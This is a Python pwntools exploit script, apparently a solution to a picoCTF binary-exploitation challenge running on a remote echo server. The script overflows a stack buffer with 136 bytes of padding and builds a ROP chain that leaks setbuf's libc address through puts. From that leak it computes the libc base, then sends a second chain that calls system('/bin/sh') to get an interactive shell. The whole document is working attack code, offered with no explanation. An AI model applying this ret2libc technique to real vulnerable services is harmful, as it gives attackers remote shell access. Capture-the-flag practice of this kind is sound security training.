import pwnlib.util.packing as pack
from pwn import log, process, remote

p = remote('mercury.picoctf.net', 49464)  
p.recvuntil(b"WeLcOmE To mY EcHo sErVeR!")

padding = b"A" * 136
pop_rdi = 0x400913  # popping rdi
setbuf_at_got = 0x601028  # setbuf() in GOT
puts_at_plt = 0x400540  # puts() in PLT
main = 0x400771  # Address of main for returning safely after leaking setbuf() address in libc

payload = padding  # Pad the stack until the stored RIP
payload += pack.p64(pop_rdi)  # Set the address of setbuf() in GOT as the first argument of puts()
payload += pack.p64(setbuf_at_got)  # This will be the first argument of puts()
payload += pack.p64(puts_at_plt)  # Call puts()
payload += pack.p64(main)  # Return to main() so the program doesnt crash

p.sendline(payload)
p.recvline() 
p.recvline()  
leak = pack.u64(p.recvline().strip().ljust(8, b"\x00"))  
log.info(f"Leaked setbuf Address -> {hex(leak)}")

offset = 0x88540
libc_start = leak - offset
log.info(f"Libc Start Address -> {hex(libc_start)}")

system_addr = libc_start + 0x4f4E0
log.info(f"Libc System Address -> {hex(system_addr)}")

bin_addr = libc_start + 0x01B40FA
log.info(f"Libc /bin/sh Address -> {hex(bin_addr)}")

ret_addr = 0x40052e


payload = padding
payload += pack.p64(pop_rdi)
payload += pack.p64(bin_addr)
payload += pack.p64(ret_addr)
payload += pack.p64(system_addr)

p.sendline(payload)

p.interactive()







